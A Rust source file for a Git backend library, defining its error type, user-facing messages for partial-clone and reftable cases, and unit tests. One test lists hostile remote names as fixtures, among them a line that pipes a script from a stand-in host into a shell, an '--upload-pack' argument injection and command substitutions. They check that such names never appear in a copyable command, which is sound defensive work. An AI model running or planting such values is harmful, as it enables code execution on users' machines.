//! Error type shared by every backend operation.

use std::path::PathBuf;

/// Result alias used throughout `canopy-core`.
pub type Result<T, E = Error> = std::result::Result<T, E>;

/// Everything that can go wrong while reading or changing a repository.
#[derive(Debug, thiserror::Error)]
pub enum Error {
    /// libgit2 reported an error.
    #[error("{}", .0.message())]
    Git(#[from] git2::Error),

    /// A `git` command line invocation failed. `stderr` holds git's own explanation.
    #[error("git {command} failed: {stderr}")]
    Cli {
        /// The sub-command, e.g. `push`.
        command: String,
        /// Trimmed standard error of the process.
        stderr: String,
    },

    /// The `git` executable could not be started.
    #[error("could not run git ({0}); is git installed and on PATH?")]
    GitMissing(#[source] std::io::Error),

    /// The path is not inside a Git repository.
    #[error("{} is not a Git repository", .0.display())]
    NotARepository(PathBuf),

    /// The repository has no working directory (bare repository).
    #[error("bare repositories are not supported yet")]
    Bare,

    /// A file system operation failed.
    #[error(transparent)]
    Io(#[from] std::io::Error),

    /// A precondition the caller should have checked did not hold.
    #[error("{0}")]
    Invalid(String),

    /// A file changed on disk after the caller read it, so writing would discard those changes.
    /// Holds the path relative to the working tree. Nothing was written; reload the file and
    /// retry.
    #[error("{0} changed on disk since it was loaded. Reload it before saving.")]
    ChangedOnDisk(String),

    /// A path was refused before any file was read or written: it is empty, absolute, contains
    /// `..` or a `.git` component, or goes through a symbolic link. Nothing was read or written.
    #[error("{path} {reason}.")]
    UnsafePath {
        /// The path as given (relative to the working tree, or the file Canopy refused).
        path: String,
        /// Why it was refused, e.g. "goes through a symbolic link".
        reason: &'static str,
    },

    /// The repository is a partial clone (`git clone --filter=...`) and the read needs objects
    /// that were not downloaded. Retrying with [`crate::MissingObjects::Download`] fetches them
    /// when `remote` is set and reachable.
    #[error("{}", not_downloaded_message(.remote.as_deref(), .reason.as_deref()))]
    NotDownloaded {
        /// The promisor remote the objects can come from; `None` when no remote is configured
        /// (for example after `git remote remove`), so downloading is impossible.
        remote: Option<String>,
        /// Why downloading failed (git's stderr); `None` when no download was attempted.
        reason: Option<String>,
    },

    /// A partial clone made by Git before 2.24 records its promisor remote in
    /// `extensions.partialClone`, a repository extension libgit2 refuses to open.
    #[error("{}", legacy_partial_clone_message(.remote))]
    LegacyPartialClone {
        /// The promisor remote named by `extensions.partialClone`.
        remote: String,
    },
    /// `extensions.refStorage = reftable`, a ref format libgit2 cannot read.
    #[error(
        "Canopy cannot open this repository yet: it stores its references in Git's reftable format. Git itself still works with it."
    )]
    Reftable,
}

/// The message for [`Error::LegacyPartialClone`]. The remote name comes from the repository's own
/// configuration and the message is meant to be copied into a shell, so it names a command only
/// for a plain remote name.
fn legacy_partial_clone_message(remote: &str) -> String {
    let plain = !remote.is_empty()
        && !remote.starts_with('-')
        && remote
            .bytes()
            .all(|b| b.is_ascii_alphanumeric() || matches!(b, b'.' | b'_' | b'-'));
    let what = "This partial clone uses the old extensions.partialClone setting, which Canopy \
                cannot open. Git 2.24 and newer record the same thing as remote.<name>.promisor";
    if plain {
        format!(
            "{what}; to convert it, run `git config remote.{remote}.promisor true` and then \
             `git config --unset extensions.partialClone` in the repository."
        )
    } else {
        format!(
            "{what}; to convert it, edit the repository's .git/config: set promisor = true on \
             the remote that extensions.partialClone names, then remove that setting. Its name \
             is not shown because it is not a plain remote name."
        )
    }
}

fn not_downloaded_message(remote: Option<&str>, reason: Option<&str>) -> String {
    let what = "This content hasn't been downloaded yet (partial clone).";
    match (remote, reason) {
        (Some(r), None) => format!("{what} It can be fetched from {r}."),
        (Some(r), Some(why)) => format!("{what} Fetching it from {r} failed: {why}"),
        (None, Some(why)) => format!("{what} {why}"),
        (None, None) => format!("{what} No promisor remote is configured to fetch it from."),
    }
}

impl Error {
    /// The read failed only because a partial clone has not downloaded what it needs, and
    /// retrying with [`crate::MissingObjects::Download`] can fetch it (a remote is configured).
    pub fn can_download(&self) -> bool {
        matches!(
            self,
            Self::NotDownloaded {
                remote: Some(_),
                ..
            }
        )
    }

    pub(crate) fn invalid(msg: impl Into<String>) -> Self {
        Self::Invalid(msg.into())
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn legacy(remote: &str) -> String {
        Error::LegacyPartialClone {
            remote: remote.to_owned(),
        }
        .to_string()
    }

    #[test]
    fn legacy_partial_clone_names_a_plain_remote_in_the_command() {
        let msg = legacy("origin");
        assert!(
            msg.contains("`git config remote.origin.promisor true`"),
            "{msg}"
        );
    }

    #[test]
    fn legacy_partial_clone_never_prints_an_odd_remote_name_as_a_command() {
        // The name comes from the repository's own configuration, and the message is meant to be
        // copied into a shell.
        for remote in [
            "x; curl evil.example/p.sh | sh; #",
            "--upload-pack=x",
            "a b",
            "$(id)",
            "a`id`",
            "a\nb",
            "",
        ] {
            let msg = legacy(remote);
            assert!(!msg.contains("git config remote."), "{remote:?}: {msg}");
            assert!(
                remote.is_empty() || !msg.contains(remote),
                "{remote:?}: {msg}"
            );
        }
    }

    #[test]
    fn git_missing_exposes_the_io_error_as_its_source() {
        use std::error::Error as _;

        let cause = std::io::Error::from(std::io::ErrorKind::NotFound);
        let expected = cause.to_string();
        let err = Error::GitMissing(cause);
        let source = err.source().expect("GitMissing has a source");
        assert_eq!(source.to_string(), expected);
        assert!(source.downcast_ref::<std::io::Error>().is_some());
        assert!(err.to_string().contains(&expected), "{err}");
    }
}
